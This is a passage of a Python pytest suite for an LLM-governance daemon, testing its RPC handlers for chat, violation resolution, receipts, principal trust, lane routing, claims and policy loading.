        async def noop(method: str, params: dict) -> None:
            pass

        handler = d._streaming_handlers["chat.stream"]
        result = await handler(
            {"messages": [{"role": "user", "content": "revise"}]},
            noop,
        )
        assert result["pending"] is None

    @pytest.mark.asyncio
    async def test_send_non_resolution_message_re_presents_pending(
        self, dispatcher_with_pending
    ):
        """Non-resolution messages should re-present the pending violation."""
        d, _ = dispatcher_with_pending
        resp = await roundtrip(d, "chat.send", {
            "messages": [{"role": "user", "content": "tell me a joke"}],
        })
        result = resp["result"]
        assert result["pending"] is not None
        assert result["pending"]["id"] == "pending_test_1"

    @pytest.mark.asyncio
    async def test_send_without_pending_generates_normally(
        self, dispatcher_with_chat
    ):
        """When no pending violation, chat.send generates as usual."""
        d, _ = dispatcher_with_chat
        resp = await roundtrip(d, "chat.send", {
            "messages": [{"role": "user", "content": "Hi"}],
        })
        result = resp["result"]
        assert result["pending"] is None
        assert result["content"] == "Hello from the governed LLM"


# =============================================================================
# Receipt-Exception Linking in Daemon
# =============================================================================


class TestReceiptExceptionLinkingDaemon:
    """Tests for receipt_id threading through daemon chat flow."""

    @pytest.mark.asyncio
    async def test_block_receipt_id_in_pending(self, state_with_mock_backend):
        """When chat triggers a block, pending violation gets receipt_id."""
        state = state_with_mock_backend

        # Set up receipt store dirs
        (state.governor_dir / "gate_receipts").mkdir(exist_ok=True)
        (state.governor_dir / "evidence").mkdir(exist_ok=True)

        # Create a pending violation with receipt_id via the resolver
        from governor.violation_resolver import ViolationResolver
        resolver = ViolationResolver(state.governor_dir, mode="general")
        pending = resolver.create_pending(
            [{"anchor_id": "a1", "description": "test violation", "severity": "reject"}],
            "blocked content",
            "run_001",
            receipt_id="test_receipt_123",
        )
        assert pending.receipt_id == "test_receipt_123"

        # Verify it persisted
        loaded = resolver.get_pending()
        assert loaded is not None
        assert loaded.receipt_id == "test_receipt_123"

    @pytest.mark.asyncio
    async def test_emit_chat_receipt_returns_receipt(self, state_with_mock_backend):
        """_emit_chat_receipt returns a GateReceipt object."""
        state = state_with_mock_backend
        (state.governor_dir / "gate_receipts").mkdir(exist_ok=True)
        (state.governor_dir / "evidence").mkdir(exist_ok=True)

        receipt = _emit_chat_receipt(state, "pass", "test content", "run_001")
        assert receipt is not None
        assert hasattr(receipt, "receipt_id")
        assert receipt.receipt_id  # non-empty

    @pytest.mark.asyncio
    async def test_emit_chat_receipt_returns_none_on_error(self):
        """_emit_chat_receipt returns None when receipt system fails."""
        state = MagicMock()
        state.receipt_system.emit.side_effect = RuntimeError("boom")
        state.mode = "general"

        result = _emit_chat_receipt(state, "pass", "test", "run")
        assert result is None

    @pytest.mark.asyncio
    async def test_proceed_emits_resolution_receipt(self, state_with_mock_backend):
        """Proceeding past a violation emits a resolution receipt."""
        state = state_with_mock_backend
        (state.governor_dir / "gate_receipts").mkdir(exist_ok=True)
        (state.governor_dir / "evidence").mkdir(exist_ok=True)

        # Create pending violation
        from governor.violation_resolver import ViolationResolver
        resolver = ViolationResolver(state.governor_dir, mode="general")
        state._violation_resolver = resolver
        pending = resolver.create_pending(
            [{"anchor_id": "a1", "description": "test", "severity": "reject"}],
            "blocked",
            "run_001",
            receipt_id="original_block_receipt",
        )

        # Register handlers and send "proceed" command
        d = Dispatcher()
        register_handlers(d, state)

        resp = await roundtrip(d, "chat.send", {
            "messages": [{"role": "user", "content": "proceed"}],
        })
        result = resp["result"]
        assert result["pending"] is None  # Resolved

        # Verify resolution receipt was emitted
        receipts = state.receipt_system.query(gate="violation_resolution")
        assert len(receipts) >= 1
        resolution_receipt = receipts[0]
        assert resolution_receipt.verdict == "proceed"

        # Verify evidence includes original receipt reference
        evidence = state.receipt_system.evidence_for(resolution_receipt)
        assert evidence is not None
        assert evidence["original_receipt_id"] == "original_block_receipt"
        assert evidence["action"] == "proceed"
        assert evidence["exception_id"] is not None


# =============================================================================
# Handler: governor.selfcheck
# =============================================================================


class TestGovernorSelfcheck:

    @pytest.mark.asyncio
    async def test_selfcheck_fast(self, dispatcher_and_state):
        """governor.selfcheck returns check items in fast mode."""
        d, state = dispatcher_and_state
        # Create required dirs
        (state.governor_dir / "gate_receipts").mkdir(exist_ok=True)
        (state.governor_dir / "evidence").mkdir(exist_ok=True)

        resp = await roundtrip(d, "governor.selfcheck", {"scope": "fast"})
        result = resp["result"]
        assert "items" in result
        assert "overall" in result
        assert result["overall"] == "ok"
        # Fast scope has 5 checks
        assert len(result["items"]) == 5

    @pytest.mark.asyncio
    async def test_selfcheck_full(self, dispatcher_and_state):
        """governor.selfcheck --full returns 7 check items."""
        d, state = dispatcher_and_state
        (state.governor_dir / "gate_receipts").mkdir(exist_ok=True)
        (state.governor_dir / "evidence").mkdir(exist_ok=True)

        resp = await roundtrip(d, "governor.selfcheck", {"scope": "full"})
        result = resp["result"]
        assert len(result["items"]) == 7
        assert result["overall"] == "ok"

    @pytest.mark.asyncio
    async def test_selfcheck_default_scope(self, dispatcher_and_state):
        """governor.selfcheck without scope defaults to fast."""
        d, state = dispatcher_and_state
        (state.governor_dir / "gate_receipts").mkdir(exist_ok=True)
        (state.governor_dir / "evidence").mkdir(exist_ok=True)

        resp = await roundtrip(d, "governor.selfcheck")
        result = resp["result"]
        assert len(result["items"]) == 5


# =============================================================================
# Receipt evidence provenance + principal threading
# =============================================================================


class TestReceiptProvenance:
    """Tests for backend_type, model, and principal_id in receipt evidence."""

    @pytest.mark.asyncio
    async def test_pass_receipt_has_backend_and_model(self, dispatcher_with_chat):
        """Pass receipt evidence includes backend_type and model."""
        d, state = dispatcher_with_chat
        (state.governor_dir / "gate_receipts").mkdir(exist_ok=True)
        (state.governor_dir / "evidence").mkdir(exist_ok=True)

        resp = await roundtrip(d, "chat.send", {
            "messages": [{"role": "user", "content": "Hello"}],
        })
        assert resp["result"]["pending"] is None

        receipts = state.receipt_system.query(gate="chat_bridge", verdict="pass")
        assert len(receipts) >= 1
        evidence = state.receipt_system.evidence_for(receipts[0])
        assert evidence is not None
        assert "backend_type" in evidence
        assert evidence["backend_type"] == "mock"
        assert "model" in evidence
        assert "run_id" in evidence

    @pytest.mark.asyncio
    async def test_resolution_receipt_has_backend_and_model(
        self, state_with_mock_backend
    ):
        """Resolution receipt evidence includes backend provenance."""
        state = state_with_mock_backend
        (state.governor_dir / "gate_receipts").mkdir(exist_ok=True)
        (state.governor_dir / "evidence").mkdir(exist_ok=True)

        from governor.violation_resolver import ViolationResolver
        resolver = ViolationResolver(state.governor_dir, mode="general")
        state._violation_resolver = resolver
        resolver.create_pending(
            [{"anchor_id": "a1", "description": "test", "severity": "reject"}],
            "blocked", "run_001",
        )

        d = Dispatcher()
        register_handlers(d, state)
        await roundtrip(d, "chat.send", {
            "messages": [{"role": "user", "content": "proceed"}],
        })

        receipts = state.receipt_system.query(gate="violation_resolution")
        assert len(receipts) >= 1
        evidence = state.receipt_system.evidence_for(receipts[0])
        assert "backend_type" in evidence
        assert "model" in evidence


class TestPrincipalIdThreading:
    """Tests for principal_id threading from RPC params to receipts."""

    @pytest.mark.asyncio
    async def test_default_principal_is_local(self, dispatcher_with_chat):
        """Without principal_id param, receipt gets 'local'."""
        d, state = dispatcher_with_chat
        (state.governor_dir / "gate_receipts").mkdir(exist_ok=True)
        (state.governor_dir / "evidence").mkdir(exist_ok=True)

        await roundtrip(d, "chat.send", {
            "messages": [{"role": "user", "content": "Hi"}],
        })

        receipts = state.receipt_system.query(gate="chat_bridge")
        assert len(receipts) >= 1
        assert receipts[0].principal_id == "local"

    @pytest.mark.asyncio
    async def test_principal_ignored_without_trust(self, state_with_mock_backend):
        """Client-provided principal_id is ignored when trust is disabled."""
        state = state_with_mock_backend
        (state.governor_dir / "gate_receipts").mkdir(exist_ok=True)
        (state.governor_dir / "evidence").mkdir(exist_ok=True)

        d = Dispatcher()
        register_handlers(d, state)

        await roundtrip(d, "chat.send", {
            "messages": [{"role": "user", "content": "Hi"}],
            "principal_id": "erin",
        })

        receipts = state.receipt_system.query(gate="chat_bridge")
        assert len(receipts) >= 1
        # Should be "local", not "erin" — trust not enabled
        assert receipts[0].principal_id == "local"

    @pytest.mark.asyncio
    async def test_principal_accepted_with_trust(self, state_with_mock_backend):
        """Client-provided principal_id is used when trust is enabled."""
        state = state_with_mock_backend
        (state.governor_dir / "gate_receipts").mkdir(exist_ok=True)
        (state.governor_dir / "evidence").mkdir(exist_ok=True)

        # Enable trust
        with patch.dict(os.environ, {"TRUST_PRINCIPAL_FROM_CLIENT": "1"}):
            # Re-init config cache
            state._config = None

            d = Dispatcher()
            register_handlers(d, state)

            await roundtrip(d, "chat.send", {
                "messages": [{"role": "user", "content": "Hi"}],
                "principal_id": "erin",
            })

        receipts = state.receipt_system.query(gate="chat_bridge")
        assert len(receipts) >= 1
        assert receipts[0].principal_id == "erin"


class TestDaemonStateTrustPrincipal:
    """Tests for resolve_principal and trust_principal_from_client."""

    def test_trust_disabled_by_default(self, state):
        assert state.trust_principal_from_client is False

    def test_resolve_defaults_to_local(self, state):
        assert state.resolve_principal(None) == "local"
        assert state.resolve_principal("") == "local"

    def test_resolve_ignores_client_without_trust(self, state):
        assert state.resolve_principal("erin") == "local"

    def test_resolve_uses_client_with_trust(self, state):
        with patch.dict(os.environ, {"TRUST_PRINCIPAL_FROM_CLIENT": "1"}):
            state._config = None
            assert state.resolve_principal("erin") == "erin"

    def test_trust_from_config_file(self, tmp_gov_dir):
        conf = tmp_gov_dir / "daemon.conf"
        conf.write_text("[daemon]\ntrust_principal_from_client = true\n")
        s = DaemonState(tmp_gov_dir)
        assert s.trust_principal_from_client is True

    def test_env_overrides_config(self, tmp_gov_dir):
        conf = tmp_gov_dir / "daemon.conf"
        conf.write_text("[daemon]\ntrust_principal_from_client = true\n")
        with patch.dict(os.environ, {"TRUST_PRINCIPAL_FROM_CLIENT": "0"}):
            s = DaemonState(tmp_gov_dir)
            assert s.trust_principal_from_client is False


# =============================================================================
# Auth error propagation — ClaudeCodeAuthError → AUTH_ERROR code
# =============================================================================


class TestAuthErrorPropagation:
    """Verify that ClaudeCodeAuthError is surfaced with AUTH_ERROR code."""

    @pytest.mark.asyncio
    async def test_claude_auth_error_code_in_response(self, tmp_gov_dir):
        """Handler raising ClaudeCodeAuthError produces AUTH_ERROR code."""
        from governor.chat_bridge import ClaudeCodeAuthError

        d = Dispatcher()

        async def _handler(params):
            raise ClaudeCodeAuthError("not logged in")

        d.register("test.auth_fail", _handler)
        resp = await roundtrip(d, "test.auth_fail")
        assert resp["error"]["code"] == AUTH_ERROR
        assert "not logged in" in resp["error"]["message"]
        assert "claude /login" in resp["error"]["message"].lower()

    @pytest.mark.asyncio
    async def test_codex_auth_error_code_in_response(self, tmp_gov_dir):
        """Handler raising CodexAuthError also produces AUTH_ERROR code."""
        from governor.chat_bridge import CodexAuthError

        d = Dispatcher()

        async def _handler(params):
            raise CodexAuthError("unauthorized")

        d.register("test.codex_auth_fail", _handler)
        resp = await roundtrip(d, "test.codex_auth_fail")
        assert resp["error"]["code"] == AUTH_ERROR
        assert "codex auth login" in resp["error"]["message"].lower()

    @pytest.mark.asyncio
    async def test_non_auth_error_uses_governor_code(self, tmp_gov_dir):
        """Non-auth errors still use GOVERNOR_ERROR code."""
        d = Dispatcher()

        async def _handler(params):
            raise RuntimeError("something else broke")

        d.register("test.generic_fail", _handler)
        resp = await roundtrip(d, "test.generic_fail")
        assert resp["error"]["code"] == GOVERNOR_ERROR
        assert "something else broke" in resp["error"]["message"]

    @pytest.mark.asyncio
    async def test_auth_error_not_swallowed_for_notifications(self, tmp_gov_dir):
        """Notifications silently discard errors (including auth), returning None."""
        from governor.chat_bridge import ClaudeCodeAuthError

        d = Dispatcher()

        async def _handler(params):
            raise ClaudeCodeAuthError("expired")

        d.register("test.auth_notify", _handler)
        # Notifications have no id
        notif = rpc_notification("test.auth_notify")
        result = await d.dispatch(notif)
        assert result is None


# =============================================================================
# Thin integration: new RPC handlers (correlator, scope, stability)
# =============================================================================


class TestNewRPCHandlerIntegration:
    """End-to-end: DaemonState → handler → response shape.

    These catch wiring bugs that unit tests of individual modules miss.
    """

    @pytest.mark.asyncio
    async def test_correlator_status(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        req = rpc_request("correlator.status")
        resp = await d.dispatch(req)
        result = resp["result"]
        assert "metrics" in result
        assert "regime" in result["metrics"]

    @pytest.mark.asyncio
    async def test_correlator_history(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        req = rpc_request("correlator.history", {"limit": 5})
        resp = await d.dispatch(req)
        assert isinstance(resp["result"], list)

    @pytest.mark.asyncio
    async def test_correlator_kvector(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        req = rpc_request("correlator.kvector")
        resp = await d.dispatch(req)
        # No observations yet → None
        assert resp["result"] is None

    @pytest.mark.asyncio
    async def test_scope_status(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        req = rpc_request("scope.status")
        resp = await d.dispatch(req)
        result = resp["result"]
        assert "contracts_count" in result
        assert "grants_active" in result

    @pytest.mark.asyncio
    async def test_scope_check_rejects_empty_tool_id(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        req = rpc_request("scope.check", {"tool_id": "", "scope": {}})
        resp = await d.dispatch(req)
        result = resp["result"]
        assert result["allowed"] is False
        assert "required" in result["reason"]

    @pytest.mark.asyncio
    async def test_scope_check_with_tool_id(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        req = rpc_request("scope.check", {"tool_id": "test_tool", "scope": {}})
        resp = await d.dispatch(req)
        result = resp["result"]
        assert "allowed" in result
        assert "reason" in result

    @pytest.mark.asyncio
    async def test_scope_grants(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        req = rpc_request("scope.grants")
        resp = await d.dispatch(req)
        assert isinstance(resp["result"], list)

    @pytest.mark.asyncio
    async def test_stability_status(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        req = rpc_request("stability.status")
        resp = await d.dispatch(req)
        result = resp["result"]
        assert "config" in result
        assert "total_audits" in result
        assert result["total_audits"] == 0

    @pytest.mark.asyncio
    async def test_stability_audit_requires_text(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        req = rpc_request("stability.audit", {"text": ""})
        resp = await d.dispatch(req)
        assert "error" in resp["result"]

    @pytest.mark.asyncio
    async def test_stability_audit_with_text(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        req = rpc_request("stability.audit", {"text": "Test prompt for audit."})
        resp = await d.dispatch(req)
        result = resp["result"]
        assert "fingerprint" in result
        assert result["backend"] == "none"  # identity fallback flagged

    @pytest.mark.asyncio
    async def test_stability_history(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        req = rpc_request("stability.history", {"limit": 10})
        resp = await d.dispatch(req)
        assert isinstance(resp["result"], list)

    @pytest.mark.asyncio
    async def test_stability_history_clamps_limit(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        # Negative limit should be clamped to 1
        req = rpc_request("stability.history", {"limit": -5})
        resp = await d.dispatch(req)
        assert isinstance(resp["result"], list)

    @pytest.mark.asyncio
    async def test_stability_audit_rejects_oversized_text(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        req = rpc_request("stability.audit", {"text": "x" * 200_000})
        resp = await d.dispatch(req)
        assert "error" in resp["result"]
        assert "100KB" in resp["result"]["error"]


class TestWireRoundtrip:
    """One test that exercises Content-Length framing → dispatch → response
    for a new RPC method.  Catches wire-format routing bugs."""

    @pytest.mark.asyncio
    async def test_correlator_status_over_wire(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        # Frame a request as if it arrived over stdio/socket
        req = rpc_request("correlator.status")
        wire_bytes = frame(req)

        # Parse back through the transport layer
        reader = asyncio.StreamReader()
        reader.feed_data(wire_bytes)
        reader.feed_eof()
        parsed = await read_message(reader)
        assert parsed is not None

        # Dispatch through the real handler registry
        resp = await d.dispatch(parsed)
        assert "result" in resp
        assert "metrics" in resp["result"]
        assert resp["id"] == req["id"]

        # Verify framing the response doesn't corrupt it
        writer = MagicMock()
        written = bytearray()
        writer.write = lambda data: written.extend(data)

        async def _noop_drain():
            pass

        writer.drain = _noop_drain
        await write_message(writer, resp)
        # Parse the framed response back
        resp_reader = asyncio.StreamReader()
        resp_reader.feed_data(bytes(written))
        resp_reader.feed_eof()
        roundtripped = await read_message(resp_reader)
        assert roundtripped["result"]["metrics"]["regime"] == "unknown"


# =============================================================================
# Lane routing in chat.stream
# =============================================================================


class TestChatStreamLaneRouting:
    """Test use_lanes support in chat.stream handler."""

    @pytest.mark.asyncio
    async def test_stream_with_use_lanes_returns_routing(self, dispatcher_with_chat):
        """chat.stream with use_lanes=True returns routing metadata."""
        d, state = dispatcher_with_chat
        notifications: list[dict] = []

        async def mock_notify(method: str, params: dict) -> None:
            notifications.append({"method": method, "params": params})

        handler = d._streaming_handlers["chat.stream"]
        result = await handler({
            "messages": [{"role": "user", "content": "Hello"}],
            "use_lanes": True,
        }, mock_notify)

        assert "routing" in result
        routing = result["routing"]
        assert routing["enabled"] is True
        assert "lane" in routing
        assert "risk_class" in routing
        assert "risk_class_source" in routing
        assert isinstance(routing["lane"], int)

    @pytest.mark.asyncio
    async def test_stream_without_use_lanes_no_routing(self, dispatcher_with_chat):
        """chat.stream without use_lanes has no routing key."""
        d, _ = dispatcher_with_chat
        notifications: list[dict] = []

        async def mock_notify(method: str, params: dict) -> None:
            notifications.append({"method": method, "params": params})

        handler = d._streaming_handlers["chat.stream"]
        result = await handler({
            "messages": [{"role": "user", "content": "Hello"}],
        }, mock_notify)

        assert "routing" not in result

    @pytest.mark.asyncio
    async def test_stream_lanes_fallback_returns_routing_disabled(self, tmp_gov_dir):
        """When lane routing fails, routing.enabled=false with reason."""
        state = DaemonState(tmp_gov_dir, mode="general")
        mock_backend = MockChatBackend("fallback response")
        from governor.chat_bridge import ChatBridge
        from governor.context_manager import GovernorContextManager
        ctx_mgr = GovernorContextManager(tmp_gov_dir)
        state._chat_bridge = ChatBridge(
            backend=mock_backend,
            context_manager=ctx_mgr,
            show_ok_footer=True,
        )
        state._backend_type = "mock"
        state._context_manager = ctx_mgr

        # Force lane routing to fail by breaking the lane_router
        state._lane_router = MagicMock()
        state._lane_router.route.side_effect = RuntimeError("no model registry")

        d = Dispatcher()
        register_handlers(d, state)

        notifications: list[dict] = []

        async def mock_notify(method: str, params: dict) -> None:
            notifications.append({"method": method, "params": params})

        handler = d._streaming_handlers["chat.stream"]
        result = await handler({
            "messages": [{"role": "user", "content": "Hello"}],
            "use_lanes": True,
        }, mock_notify)

        # Should fall through to normal path and include routing disabled
        assert "routing" in result
        assert result["routing"]["enabled"] is False
        assert "reason" in result["routing"]
        # Content should still come through
        assert result["content"]

    @pytest.mark.asyncio
    async def test_send_with_use_lanes_returns_routing(self, dispatcher_with_chat):
        """chat.send with use_lanes=True returns routing metadata."""
        d, _ = dispatcher_with_chat
        resp = await roundtrip(d, "chat.send", {
            "messages": [{"role": "user", "content": "Hi"}],
            "use_lanes": True,
        })
        result = resp["result"]
        assert "routing" in result
        assert result["routing"]["enabled"] is True
        assert "lane" in result["routing"]
        assert "risk_class" in result["routing"]

    @pytest.mark.asyncio
    async def test_send_without_use_lanes_no_routing(self, dispatcher_with_chat):
        """chat.send without use_lanes has no routing key."""
        d, _ = dispatcher_with_chat
        resp = await roundtrip(d, "chat.send", {
            "messages": [{"role": "user", "content": "Hi"}],
        })
        result = resp["result"]
        assert "routing" not in result

    @pytest.mark.asyncio
    async def test_stream_lanes_still_sends_deltas(self, dispatcher_with_chat):
        """chat.stream with use_lanes still sends chat.delta notifications."""
        d, _ = dispatcher_with_chat
        notifications: list[dict] = []

        async def mock_notify(method: str, params: dict) -> None:
            notifications.append({"method": method, "params": params})

        handler = d._streaming_handlers["chat.stream"]
        result = await handler({
            "messages": [{"role": "user", "content": "Hello"}],
            "use_lanes": True,
        }, mock_notify)

        # Should have received delta notifications
        assert len(notifications) > 0
        for n in notifications:
            assert n["method"] == "chat.delta"

    @pytest.mark.asyncio
    async def test_stream_lanes_records_cooldown(self, dispatcher_with_chat):
        """chat.stream with use_lanes records to cooldown store."""
        d, state = dispatcher_with_chat

        async def noop_notify(method: str, params: dict) -> None:
            pass

        handler = d._streaming_handlers["chat.stream"]
        await handler({
            "messages": [{"role": "user", "content": "Hello"}],
            "use_lanes": True,
        }, noop_notify)

        # Cooldown store should have at least one entry
        cs = state.cooldown_store
        cs._ensure_loaded()
        assert len(cs._entries) >= 1
        last = cs._entries[-1]
        assert last.validation_scope in ("full", "truncated", "skipped")
        assert last.is_cancelled is False


class TestLaneRoutingE2E:
    """End-to-end: regime → risk_class → lane policy through daemon."""

    @pytest.fixture
    def e2e_state(self, tmp_gov_dir):
        """DaemonState with mock backend and initialized lane_router."""
        state = DaemonState(tmp_gov_dir, mode="general")
        mock_backend = MockChatBackend("E2E governed response")
        from governor.chat_bridge import ChatBridge
        from governor.context_manager import GovernorContextManager
        ctx_mgr = GovernorContextManager(tmp_gov_dir)
        state._chat_bridge = ChatBridge(
            backend=mock_backend,
            context_manager=ctx_mgr,
            show_ok_footer=True,
        )
        state._backend_type = "mock"
        state._backend_kwargs = {}
        state._context_manager = ctx_mgr
        # Force lane_router init so we can rely on defaults
        _ = state.lane_router
        return state

    @pytest.fixture
    def e2e_dispatcher(self, e2e_state):
        d = Dispatcher()
        register_handlers(d, e2e_state)
        return d, e2e_state

    @pytest.mark.asyncio
    async def test_ductile_maps_to_elevated_lane_ge_2(self, e2e_dispatcher):
        """DUCTILE regime → elevated risk_class → Lane >= 2 (GENERAL)."""
        d, state = e2e_dispatcher
        from governor.regime import OperationalRegime
        state.regime_detector.current_regime = OperationalRegime.DUCTILE

        resp = await roundtrip(d, "chat.send", {
            "messages": [{"role": "user", "content": "refactor auth"}],
            "use_lanes": True,
        })
        result = resp["result"]
        routing = result["routing"]
        assert routing["enabled"] is True
        assert routing["risk_class"] == "elevated"
        assert routing["risk_class_source"] == "regime:ductile"
        assert routing["lane"] >= 2

    @pytest.mark.asyncio
    async def test_unstable_maps_to_critical_lane_ge_3(self, e2e_dispatcher):
        """UNSTABLE regime → critical risk_class → Lane >= 3 (DEEP)."""
        d, state = e2e_dispatcher
        from governor.regime import OperationalRegime
        state.regime_detector.current_regime = OperationalRegime.UNSTABLE

        resp = await roundtrip(d, "chat.send", {
            "messages": [{"role": "user", "content": "deploy to prod"}],
            "use_lanes": True,
        })
        result = resp["result"]
        routing = result["routing"]
        assert routing["enabled"] is True
        assert routing["risk_class"] == "critical"
        assert routing["risk_class_source"] == "regime:unstable"
        assert routing["lane"] >= 3

    @pytest.mark.asyncio
    async def test_elastic_maps_to_standard(self, e2e_dispatcher):
        """ELASTIC regime → standard risk_class."""
        d, state = e2e_dispatcher
        from governor.regime import OperationalRegime
        state.regime_detector.current_regime = OperationalRegime.ELASTIC

        resp = await roundtrip(d, "chat.send", {
            "messages": [{"role": "user", "content": "hello"}],
            "use_lanes": True,
        })
        result = resp["result"]
        routing = result["routing"]
        assert routing["enabled"] is True
        assert routing["risk_class"] == "standard"
        assert routing["risk_class_source"] == "regime:elastic"

    @pytest.mark.asyncio
    async def test_explicit_risk_overrides_regime(self, e2e_dispatcher):
        """Explicit risk_class parameter overrides regime-derived value."""
        d, state = e2e_dispatcher
        from governor.regime import OperationalRegime
        state.regime_detector.current_regime = OperationalRegime.ELASTIC

        resp = await roundtrip(d, "chat.send", {
            "messages": [{"role": "user", "content": "critical task"}],
            "use_lanes": True,
            "risk_class": "critical",
        })
        result = resp["result"]
        routing = result["routing"]
        assert routing["enabled"] is True
        assert routing["risk_class"] == "critical"
        assert routing["risk_class_source"] == "explicit"
        assert routing["lane"] >= 3

    @pytest.mark.asyncio
    async def test_stream_with_lanes_returns_regime_metadata(self, e2e_dispatcher):
        """chat.stream with use_lanes returns regime-derived routing metadata."""
        d, state = e2e_dispatcher
        from governor.regime import OperationalRegime
        state.regime_detector.current_regime = OperationalRegime.DUCTILE

        notifications: list[dict] = []

        async def mock_notify(method: str, params: dict) -> None:
            notifications.append({"method": method, "params": params})

        handler = d._streaming_handlers["chat.stream"]
        result = await handler({
            "messages": [{"role": "user", "content": "stream test"}],
            "use_lanes": True,
        }, mock_notify)

        routing = result["routing"]
        assert routing["enabled"] is True
        assert routing["risk_class"] == "elevated"
        assert routing["lane"] >= 2
        # Should also have sent delta notifications
        deltas = [n for n in notifications if n["method"] == "chat.delta"]
        assert len(deltas) >= 1

    @pytest.mark.asyncio
    async def test_invalid_risk_class_still_routes(self, e2e_dispatcher):
        """An unrecognized risk_class doesn't crash — treated as explicit."""
        d, _ = e2e_dispatcher
        resp = await roundtrip(d, "chat.send", {
            "messages": [{"role": "user", "content": "test"}],
            "use_lanes": True,
            "risk_class": "nonsense",
        })
        result = resp["result"]
        routing = result["routing"]
        assert routing["enabled"] is True
        assert routing["risk_class"] == "nonsense"
        assert routing["risk_class_source"] == "explicit"


# =============================================================================
# Claims (claim↔receipt correlation)
# =============================================================================


class TestClaims:
    """Tests for claims.* RPC endpoints."""

    @pytest.mark.asyncio
    async def test_claims_list_empty(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "claims.list")
        assert resp["result"] == []

    @pytest.mark.asyncio
    async def test_claims_stats_empty(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "claims.stats")
        result = resp["result"]
        assert result["total"] == 0
        assert result["total_links"] == 0

    @pytest.mark.asyncio
    async def test_claims_list_with_minted_claims(self, dispatcher_and_state):
        d, state = dispatcher_and_state
        # Mint claims directly via the store
        cs = state.claim_correlation_store
        c1 = cs.mint_claim("evidence_gate", "test claim A", "hard", run_id="run1")
        c2 = cs.mint_claim("evidence_gate", "test claim B", "soft", run_id="run1")
        resp = await roundtrip(d, "claims.list")
        result = resp["result"]
        assert len(result) == 2
        # Newest first
        assert result[0]["claim_id"] in (c1.claim_id, c2.claim_id)

    @pytest.mark.asyncio
    async def test_claims_detail_valid(self, dispatcher_and_state):
        d, state = dispatcher_and_state
        cs = state.claim_correlation_store
        c = cs.mint_claim("evidence_gate", "claim X", "hard")
        resp = await roundtrip(d, "claims.detail", {"claim_id": c.claim_id})
        result = resp["result"]
        assert result["summary"]["claim_id"] == c.claim_id
        assert isinstance(result["links"], list)
        assert isinstance(result["receipts"], list)

    @pytest.mark.asyncio
    async def test_claims_detail_invalid_id(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "claims.detail", {"claim_id": "nonexistent"})
        assert "error" in resp

    @pytest.mark.asyncio
    async def test_claims_for_receipt_empty(self, dispatcher_and_state):
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "claims.for_receipt", {"receipt_id": "unknown"})
        assert resp["result"] == []

    @pytest.mark.asyncio
    async def test_claims_window(self, dispatcher_and_state):
        d, state = dispatcher_and_state
        cs = state.claim_correlation_store
        cs.mint_claim("evidence_gate", "window test", "hard")
        resp = await roundtrip(d, "claims.window", {
            "since": "2020-01-01T00:00:00+00:00",
        })
        result = resp["result"]
        assert result["schema"] == "claims_window.v1"
        assert result["count"] >= 1

    @pytest.mark.asyncio
    async def test_existing_rpcs_unaffected(self, dispatcher_and_state):
        """Backwards compat: existing RPCs still work after adding claims.*."""
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "governor.hello")
        assert "protocol_version" in resp["result"]
        resp2 = await roundtrip(d, "receipts.list")
        assert isinstance(resp2["result"], list)


# =============================================================================
# Policy engine RPC handlers
# =============================================================================


def _make_pass_rule(rule_id: str = "r1", caps_any: list[str] | None = None,
                    subject_kinds: list[str] | None = None) -> dict:
    """Helper: build a pass rule dict for policy.json."""
    rule: dict[str, Any] = {
        "rule_id": rule_id,
        "effect": "pass",
        "priority": 10,
    }
    if caps_any:
        rule["match_capabilities_any"] = caps_any
    if subject_kinds:
        rule["match_subject_kinds"] = subject_kinds
    return rule


def _make_warn_rule(rule_id: str = "w1", obligations: list[dict] | None = None,
                    subject_kinds: list[str] | None = None) -> dict:
    rule: dict[str, Any] = {
        "rule_id": rule_id,
        "effect": "warn",
        "priority": 10,
    }
    if obligations:
        rule["obligations"] = obligations
    if subject_kinds:
        rule["match_subject_kinds"] = subject_kinds
    return rule


def _write_policy(gov_dir: Path, rules: list[dict], **kwargs: Any) -> None:
    """Write a policy.json to the governor directory."""
    policy = {
        "policy_bundle_id": kwargs.get("bundle_id", "test.bundle"),
        "policy_bundle_version": kwargs.get("bundle_version", "1.0.0"),
        "default_verdict": kwargs.get("default_verdict", "block"),
        "rules": rules,
    }
    (gov_dir / "policy.json").write_text(json.dumps(policy))


def _make_eval_request(caps: list[str] | None = None,
                       kind: str = "gate_event",
                       action: str = "check") -> dict:
    """Build a minimal PolicyEvalRequest dict for testing."""
    return {
        "subject": {
            "kind": kind,
            "subject_id": "test",
            "action": action,
            "capabilities": caps or [],
        },
        "context": {
            "gate_name": "test_gate",
            "trust_mode": "local",
        },
    }


class TestPolicy:
    """Tests for policy.* RPC endpoints."""

    @pytest.mark.asyncio
    async def test_policy_info_default(self, dispatcher_and_state):
        """No policy.json → source='default', load_status='missing_file'."""
        d, _ = dispatcher_and_state
        resp = await roundtrip(d, "policy.info")
        result = resp["result"]
        assert result["source"] == "default"
        assert result["load_status"] == "missing_file"
        assert result["policy_bundle_id"] == "governor.default"
        assert result["policy_content_hash"] is None
        assert result["loaded_at"] is not None

    @pytest.mark.asyncio
    async def test_policy_info_from_file(self, dispatcher_and_state):
        """policy.json exists → source='file', load_status='loaded'."""
        d, state = dispatcher_and_state
        # Reset cache so it reloads
        state._policy_rule_set = None
        state._policy_load_status = None
        _write_policy(state.governor_dir, [_make_pass_rule()],
                      bundle_id="test.file", bundle_version="2.0.0")
